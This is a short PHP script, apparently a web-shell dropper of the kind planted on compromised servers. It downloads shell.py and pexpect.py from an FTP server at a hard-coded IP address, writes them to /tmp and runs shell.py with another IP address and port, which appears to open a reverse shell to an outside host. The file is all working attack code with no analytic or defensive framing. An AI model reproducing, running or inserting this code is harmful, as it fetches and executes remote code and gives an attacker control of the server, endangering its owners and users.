<?php
/* Returns the contents of file name passed */
function get_file_contents($filename)
{
    if (!function_exists('file_get_contents'))
    {
        $fhandle = fopen($filename, "r");
        $fcontents = fread($fhandle, filesize($filename));
        fclose($fhandle);
    }
    else
    {
        $fcontents = file_get_contents($filename);
    }
    return $fcontents;
}
/* Returns the contents of file name passed */
function put_file_contents($filename, $cont)
{
    if (!function_exists('file_put_contents'))
    {
        $fhandle = fopen($filename, "w");
        $fcontents = fwrite($fhandle, $cont);
        fclose($fhandle);
    }
    else
    {
        file_put_contents($filename, $cont);
    }
}
$str = get_file_contents( 'ftp://95.181.93.72/ftppub/shell.py' );
put_file_contents( '/tmp/shell.py', $str );
$str = get_file_contents( 'ftp://95.181.93.72/ftppub/pexpect.py' );
put_file_contents( '/tmp/pexpect.py', $str );
system( 'python2 /tmp/shell.py 82.200.55.186 8889' );
?>
